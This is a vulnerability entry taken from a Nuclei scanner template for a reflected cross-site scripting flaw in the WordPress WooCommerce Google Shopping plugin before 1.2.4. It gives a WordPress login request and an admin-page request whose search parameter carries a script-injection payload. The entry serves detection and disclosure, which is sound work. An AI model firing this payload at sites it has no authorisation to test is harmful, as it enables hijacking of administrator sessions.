# Vulnerability: WordPress WooCommerce Google Shopping < 1.2.4 - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`elex-woocommerce-xss.yaml`)

## Description
WordPress WooCommerce Google Shopping < 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and executing it in a logged in admin context.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}
```

